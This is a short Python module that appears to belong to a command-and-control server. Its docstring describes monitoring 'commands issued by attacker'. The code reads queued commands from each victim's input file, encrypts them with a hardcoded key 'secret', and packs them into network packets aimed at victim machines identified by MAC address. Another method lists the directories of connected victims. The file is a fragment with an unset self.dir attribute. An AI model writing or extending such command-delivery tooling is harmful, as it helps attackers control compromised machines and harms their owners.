"""Module designed to monitor commands issued by attacker to queue
"""
from threading import Thread, Timer
# from ..utils.consts import DEFAULT_DATA_DIR, DEFAULT_CMD_FILE
from utils.encrypt import Encrypter
from bundler.bundler import Bundler

import math
import os
import time

class CommandParser():

    def parse(self, victim_mac, victim_pkt, rel_path, command_file):
        """Parses the input file in the input directory of victim and builds packet for command
        
        Returns:
            Ether[] -- list of packets that contain command data
        """

        # Read corresponding folder for input file
        pkts = []
        path = rel_path + '/input/' + command_file
        if os.path.isfile(path):
            bundler = Bundler(victim_pkt)

            # Open file contents, encrypt, and build response packet
            with open(path) as f:
                parsed_commands = []

                for line in f:
                    line = line.replace('\n', '')
                    parsed_commands.append(Encrypter(line, 'secret').encrypt())
                    # parsed_commands.append(line)

                for cmd in parsed_commands:
                    pkt = bundler.build_command_pkt(cmd)
                    pkts.append(pkt)
        
            # os.remove(path) # Done reading file
        return pkts

    def _get_victim_dirs(self):
        """Get corresponding victims that connected to the server
        """
        res = []
        print(self.dir)
        for victim in os.listdir(self.dir):
            if os.path.isdir(os.path.join(self.dir, victim)):
                res.append(os.path.join(self.dir, victim))

        return res
